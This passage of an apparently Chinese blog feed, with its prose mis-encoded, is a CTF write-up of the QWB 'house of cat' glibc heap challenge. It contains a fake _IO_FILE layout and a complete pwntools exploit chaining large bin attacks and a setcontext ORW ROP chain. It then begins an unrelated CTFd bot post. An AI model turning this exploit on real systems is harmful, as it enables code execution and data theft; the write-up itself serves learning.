class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_io_addr=heapbase+<span class="hljs-number">0xb00</span> <span class="hljs-comment"># ä¼ªé€ çš„fake_IOç»“æ„ä½“çš„åœ°å€</span><br>next_chain = <span class="hljs-number">0</span><br>fake_IO_FILE=p64(rdi)         <span class="hljs-comment">#_flags=rdi</span><br>fake_IO_FILE+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span><br>fake_IO_FILE +=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># rcx!=0(FSOP)</span><br>fake_IO_FILE +=p64(fake_io_addr+<span class="hljs-number">0xb0</span>)<span class="hljs-comment">#_IO_backup_base=rdx</span><br>fake_IO_FILE +=p64(call_addr)<span class="hljs-comment">#_IO_save_end=call addr(call setcontext/system)</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heapbase+<span class="hljs-number">0x1000</span>)  <span class="hljs-comment"># _lock = a writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE +=p64(fake_io_addr+<span class="hljs-number">0x30</span>)<span class="hljs-comment">#_wide_data,rax1_addr</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc0</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) <span class="hljs-comment">#mode=1</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(libcbase+<span class="hljs-number">0x2160c0</span>+<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># vtable=IO_wfile_jumps+0x10</span><br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span><br>fake_IO_FILE += p64(fake_io_addr+<span class="hljs-number">0x40</span>)  <span class="hljs-comment"># rax2_addr</span><br></code></pre></td></tr></table></figure><h2 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯house-of-cat"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯house-of-cat" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯house of  cat"></a>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯house of  cat</h2><h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><p>æ•´ä½“é€†å‘æ€è·¯ç±»ä¼¼äº[chunqiuIOT](<a href="https://loora1n.github.io/2022/11/03/i%E6%98%A5%E7%A7%8B%E6%98%A5%E5%AD%A3%E8%B5%9B-%E5%8B%87%E8%80%85%E5%B7%85%E5%B3%B0-chunqiuIOT/">iæ˜¥ç§‹æ˜¥å­£èµ›-å‹‡è€…å·…å³°-chunqiuIOT - é·ºé›¨ã®Blog (loora1n.github.io)</a>)é‚£é“é¢˜ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯<strong>IO_FILEå‡çº§ç‰ˆ</strong>ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹æ ¸å¿ƒçš„å‡ ä¸ªå‡½æ•°</p><p><img src="/img/article/house_of_cat/image-20221113212407882.png" alt="add"></p><p><img src="/img/article/house_of_cat/image-20221113212432448.png" alt="del"></p><p><img src="/img/article/house_of_cat/image-20221113212454297.png" alt="edit"></p><p><img src="/img/article/house_of_cat/image-20221113212643434.png" alt="show"></p><ul><li>å­˜åœ¨UAFæ¼æ´</li><li>å¯ä»¥ç”³è¯·<strong>0x470~0x418</strong>å¤§å°çš„chunk</li><li>åªæœ‰ä¸¤æ¬¡editçš„æœºä¼šï¼Œä¸”é•¿åº¦ä¸º0x30</li><li>showå‡½æ•°å›ºå®šè¾“å‡º0x30é•¿åº¦çš„å†…å®¹</li></ul><h3 id="æ²™ç›’"><a href="#æ²™ç›’" class="headerlink" title="æ²™ç›’"></a>æ²™ç›’</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./houseofcat  <br></code></pre></td></tr></table></figure><p><img src="/img/article/house_of_cat/image-20221110125159203.png" alt="image-20221110125159203"></p><p>åªèƒ½ä½¿ç”¨orwï¼Œä¸”é™åˆ¶äº†fdä¸º0</p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>æ— æ³•é€€å‡ºmainå‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰exitç­‰èƒ½é€ æˆFSOPçš„æ–¹å¼ï¼Œä½†æ˜¯stderrä¸åœ¨bssä¸Šè€Œåœ¨libcä¸­ï¼Œå¯ä»¥åœ¨å¾—åˆ°libcåœ°å€ålarge bin attackä½äºlibcä¸­çš„stderrï¼Œå†åœ¨å¾—åˆ°heapåœ°å€çš„åŸºç¡€ä¸Šä¿®æ”¹top chunkçš„sizeï¼Œè¿™é‡Œç”¨large bin attackä¿®æ”¹ã€‚æ‰€ä»¥ä¸¤æ¬¡editç›¸å½“äºç»™äº†ä¸¤æ¬¡large bin attackçš„æœºä¼šï¼Œä¸€æ¬¡ç”¨æ¥large bin attack stderrï¼Œä¸€æ¬¡ç”¨æ¥large bin attack topchunkâ€™s sizeã€‚å¦å¤–ç”±äºå¯¹fdçš„æ£€æŸ¥ï¼Œéœ€è¦close(0)ä½¿flagæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ä¸º0,æˆ–è€…ç”¨mmapå‡½æ•°å°†flagæ˜ å°„è¯»å…¥ã€‚</p><ul><li>æ³„éœ²libcåœ°å€å’Œå †åœ°å€</li><li>large bin attack stderr</li><li>large bin attack topchunkâ€™s size</li><li>ä¼ªé€ fake_IO</li><li>è§¦å‘<code>__malloc_assert</code>, è¿›å…¥<code>_IO_wfile_seekoff</code>è½¬åˆ°<code>_IO_switch_to_wget_mode</code></li><li>setcontextæ‰§è¡Œropé“¾(orwéœ€è¦æ³¨æ„fdåº”å…ˆ<code>close(0)</code>)</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># libc = ELF(&#x27;/home/loorain/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-F&#x27;</span> <span class="hljs-string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="hljs-string">&#x27;-P&#x27;</span>]<br><br>io = process(<span class="hljs-string">&#x27;./houseofcat&#x27;</span>)<br><span class="hljs-comment"># io = remote(&#x27;210.30.97.133&#x27;,28065)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>    gdb.attach(proc.pidof(io)[<span class="hljs-number">0</span>],<span class="hljs-string">&#x27;b* (_IO_wfile_seekoff)&#x27;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    payload = <span class="hljs-string">&quot;LOGIN | r00t QWB QWXFadmin&quot;</span><br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~\n&#x27;</span>,payload)<br>    <span class="hljs-comment"># payload = &quot;CAT | r00t QWB QWXF\xFF\xFF\xFF\xFF&quot;</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,cont</span>):<br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendafter(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>,cont)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,cont</span>):<br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    io.sendafter(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>, cont)<br>    <br><br>login()<br><span class="hljs-comment"># p()</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x420</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<br><span class="hljs-comment"># p()</span><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x440</span>,<span class="hljs-string">&#x27;ddd&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment">#libc_base</span><br>io.recvuntil(<span class="hljs-string">&#x27;Context:\n&#x27;</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21a0d0</span><br>io.recv(<span class="hljs-number">10</span>)<br>heapbase = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>success(<span class="hljs-string">&quot;libc_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>success(<span class="hljs-string">&quot;heapbase--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(heapbase))<br><span class="hljs-comment"># p()</span><br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002be51</span> <span class="hljs-comment">#: pop rsi ; ret</span><br>pop_rdx = libc_base + <span class="hljs-number">0x000000000011f497</span> <span class="hljs-comment">#: pop rdx ; pop r12 ; ret</span><br>pop_rax = libc_base + <span class="hljs-number">0x0000000000045eb0</span> <span class="hljs-comment">#: pop rax ; ret</span><br>ret=libc_base+<span class="hljs-number">0x0000000000029cd6</span><br>stderr=libc_base+libc.sym[<span class="hljs-string">&#x27;stderr&#x27;</span>]<br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>close=libc_base+libc.sym[<span class="hljs-string">&#x27;close&#x27;</span>]<br>read=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>syscallret=libc_base+libc.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)).__next__()<br>success(<span class="hljs-string">&#x27;syscall_ret--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(syscallret))<br><br><span class="hljs-comment">#fake IO</span><br>ioaddr=heapbase+<span class="hljs-number">0xb00</span><br>next_chain = <span class="hljs-number">0</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE +=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">2</span>)<br>fake_IO_FILE +=p64(heapbase+<span class="hljs-number">0xc18</span>-<span class="hljs-number">0x68</span>)<span class="hljs-comment">#rdx</span><br>fake_IO_FILE +=p64(setcontext+<span class="hljs-number">61</span>)<span class="hljs-comment">#call addr</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heapbase+<span class="hljs-number">0x200</span>)  <span class="hljs-comment"># _lock = writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE +=p64(heapbase+<span class="hljs-number">0xb30</span>) <span class="hljs-comment">#rax1</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xB0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _mode = 1</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(libc_base+<span class="hljs-number">0x2160d0</span>)  <span class="hljs-comment"># vtable=IO_wfile_jumps+0x10</span><br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span><br>fake_IO_FILE += p64(heapbase+<span class="hljs-number">0xb30</span>+<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># rax2</span><br>flagaddr=heapbase+<span class="hljs-number">0x17d0</span><br>payload1=fake_IO_FILE+p64(flagaddr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(heapbase+<span class="hljs-number">0x2050</span>)+p64(ret)<br><br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x418</span>,payload1)<br>delete(<span class="hljs-number">6</span>)<br><span class="hljs-comment"># p()</span><br><span class="hljs-comment">#large bin attack stderr poiniter</span><br>edit(<span class="hljs-number">0</span>,p64(libc_base+<span class="hljs-number">0x21a0d0</span>)*<span class="hljs-number">2</span>+p64(heapbase+<span class="hljs-number">0x290</span>)+p64(stderr-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x440</span>,<span class="hljs-string">&#x27;aaaaa&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;eee&#x27;</span>)<br><br><span class="hljs-comment">#rop</span><br>payload=p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(close)\<br>    +p64(pop_rdi)+p64(flagaddr)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(pop_rax)+p64(<span class="hljs-number">2</span>)+p64(syscallret)\<br>        +p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(pop_rsi)+p64(flagaddr)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(read)\<br>            +p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(write)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x430</span>,payload)<br>delete(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x450</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>))<br>delete(<span class="hljs-number">8</span>)<br><span class="hljs-comment"># p()</span><br><br>edit(<span class="hljs-number">5</span>,p64(libc_base+<span class="hljs-number">0x21a0e0</span>)*<span class="hljs-number">2</span>+p64(heapbase+<span class="hljs-number">0x1370</span>)+p64(heapbase+<span class="hljs-number">0x28e0</span>-<span class="hljs-number">0x20</span>+<span class="hljs-number">3</span>))<br><span class="hljs-comment">#trigger __malloc_assert</span><br>io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">11</span>))<br><span class="hljs-comment">#gdb.attach(io,&#x27;b* (_IO_wfile_seekoff)&#x27;)</span><br>io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat size:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x450</span>))  <span class="hljs-comment"># add(11,0X450)</span><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€CTFd äºŒæ¬¡å¼€å‘ã€‘è§£é¢˜æ’­æŠ¥æœºå™¨äºº V2</title>
    <link href="/2022/11/08/%E3%80%90CTFd%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E3%80%91%E8%A7%A3%E9%A2%98%E6%92%AD%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%20V2/"/>
    <url>/2022/11/08/%E3%80%90CTFd%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E3%80%91%E8%A7%A3%E9%A2%98%E6%92%AD%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%20V2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡åŸºäº CTFd Version 3.4.3 å¼€å‘ï¼Œå¯èƒ½å­˜åœ¨æºç ä¸ç›¸åŒçš„æƒ…å†µï¼Œé˜…è¯»æ—¶è¯·æ³¨æ„æ–‡ç« æ—¶æ•ˆæ€§ã€‚</p></blockquote><h2 id="æ›´æ–°å†…å®¹"><a href="#æ›´æ–°å†…å®¹" class="headerlink" title="æ›´æ–°å†…å®¹"></a>æ›´æ–°å†…å®¹</h2><ul><li>å®ç°CTFdåˆ›å»ºæ–°é¢˜ç›®çš„æ’­æŠ¥ï¼Œä¸”ä»…åœ¨é¢˜ç›®çŠ¶æ€ç”±<code>hidden</code>è½¬ä¸º<code>visible</code>æ—¶æ’­æŠ¥</li><li>å®ç°é¢˜ç›®ä¿¡æ¯æ›´æ–°æ—¶ï¼Œè¿›è¡Œæ’­æŠ¥</li></ul><p><img src="/img/article/botv2/image-20221108200108487.png" alt="æ•ˆæœå±•ç¤º"></p><h2 id="å‰ç«¯é¡µé¢ä¿®æ”¹"><a href="#å‰ç«¯é¡µé¢ä¿®æ”¹" class="headerlink" title="å‰ç«¯é¡µé¢ä¿®æ”¹"></a>å‰ç«¯é¡µé¢ä¿®æ”¹</h2><h3 id="appearance-html"><a href="#appearance-html" class="headerlink" title="appearance.html"></a>appearance.html</h3><p>æ‰“å¼€<code>CTFd/CTFd/themes/admin/templates/configs/appearance.html</code>ï¼Œåœ¨ä¸Šæ¬¡æ›´æ–°çš„åŸºç¡€ä¸Šå¢åŠ é¢˜ç›®åˆ›å»ºæ’­æŠ¥æ–‡æ¡ˆï¼Œå’Œé¢˜ç›®ä¿¡æ¯æ›´æ–°æ’­æŠ¥æ–‡æ¡ˆæ¥å£ã€‚è¿™é‡Œç›´æ¥æ”¾å‡ºå®Œæ•´htmlï¼Œå¯è‡ªè¡Œå¯¹ç…§</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;tabpanel&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;tab-pane config-section active&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;appearance&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;w-100&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;ctf_name&quot;</span>&gt;</span><br>Competition Name<br><span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span>Competition name displayed instead of a logo<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;ctf_name&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;ctf_name&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;CTF Name&quot;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">ctf_name</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">ctf_name</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; ctf_name &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>CTF Description<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span 